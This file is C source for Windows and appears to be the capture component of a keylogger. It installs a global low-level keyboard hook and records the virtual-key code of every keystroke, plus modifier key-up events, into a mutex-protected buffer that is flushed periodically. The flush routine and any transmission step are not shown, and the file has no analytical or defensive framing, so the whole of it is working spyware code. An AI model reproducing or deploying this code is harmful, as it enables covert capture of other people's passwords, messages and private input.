#include "kbdHandler.h"

DWORD WINAPI kbdDump()
{
    // Setup Hook to handle Low Level Keyboard Events. ( also Index=0 becase Index doesn't have any value )
    Index = 0;
    Hook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC) _hookHandler, NULL, 0);
    if (Hook == NULL)
    {
#ifdef DEBUG
        handleError("SetWindowsHookEx");
#endif
        return -1;
    }

    // Setup GetMessage loop to Receive Keyboard Events ( Hook will Handle them, we need to just receive them here)
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {};

    // Cleanup
    UnhookWindowsHookEx(Hook);

    return 0;
}

LRESULT CALLBACK _hookHandler(int nCode, WPARAM wParam, LPARAM lParam)
{
    // Waiting Mutex to be Released ( Maybe Timer is Flushing rn, so Buffer and Index are in inconsistent state )
    DWORD waitRes = WaitForSingleObject(Mutex, INFINITE);
    switch (waitRes)
    {
    case WAIT_OBJECT_0:
        __try
        {
            // If we are at the end of Buffer, First Flush and set LastFlush to Current Time.
            if (Index == BUFFSIZE)
            {
                GetSystemTimeAsFileTime(&LastFlush);
                flush();
            }

            if (nCode >= 0)
            {
                // Get Virtual Key Code
                DWORD code = ((KBDLLHOOKSTRUCT*)lParam)->vkCode;
                
                // Record Keydown for all Keys
                if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
                {
                    switch (code)
                    {
                    // Shift
                    case VK_SHIFT:
                    case VK_LSHIFT:
                    case VK_RSHIFT:
                    
                    // Ctrl
                    case VK_CONTROL:
                    case VK_LCONTROL:
                    case VK_RCONTROL:
                    
                    // Menu/Alt
                    case VK_MENU:
                    case VK_LMENU:
                    case VK_RMENU:
                    
                    // Win Key
                    case VK_LWIN:
                    case VK_RWIN:

                        // For Win, Shift, Ctrl and Alt. set 9th bit ( representing that its Keydown ) ( because Keyup is important for them )
                        code |= 0x100;
                        if(Index >0)
                        if (Buffer[Index-1] == code)
                            break;
                    default:
                        // Escaping Reserved/Undefined/OEM Specific/Unassigned Keys Based on MSDN: https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
                        if (code == 0x7 || code == 0xA || code == 0xB || code == 0xE ||
                            code == 0xF || (code >= 0x3A && code <= 0x40) || code == 0x5e ||
                            (code >= 0x88 && code <= 0x8F) || (code >= 0x92 && code <= 0x9F) ||
                            code == 0xB8 || code == 0xB9 || (code >= 0xC1 && code <= 0xDA) ||
                            code == 0xE0 || code == 0xE1 || code == 0xE3 || code == 0xE4 ||
                            code == 0xE6 || (code >= 0xE8 && code <= 0xF5) || code == 0xE7 ||
                            code == 0XFC
                            )
                        {
                            break;
                        }

#pragma warning (disable: 6386)
                        Buffer[Index++] = code;
#pragma warning (default: 6386)
                    }
                }

                // Only Record Keyup for Win, Shift, Ctrl and Alt. without setting 9th bit ( to say its Keyup )
                if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP)
                {
                    switch (code)
                    {
                    // Shift
                    case VK_SHIFT:
                    case VK_LSHIFT:
                    case VK_RSHIFT:
                    
                    // Ctrl
                    case VK_CONTROL:
                    case VK_LCONTROL:
                    case VK_RCONTROL:
                    
                    // Menu/Alt
                    case VK_MENU:
                    case VK_LMENU:
                    case VK_RMENU:
                    
                    // Win Key
                    case VK_LWIN:
                    case VK_RWIN:
#pragma warning (disable: 6386)
                        Buffer[Index++] = code;
#pragma warning (default: 6386)
                    }
                }
            }
        }
        __finally
        {
            // Release Mutex, so timer can start checking
            if (!ReleaseMutex(Mutex))
#ifdef DEBUG
                handleError("ReleaseMutex");
#endif
        }
        break;
    }

    // Call Next Hook ( Convention in MSDN )
    return CallNextHookEx(Hook, nCode, wParam, lParam);
}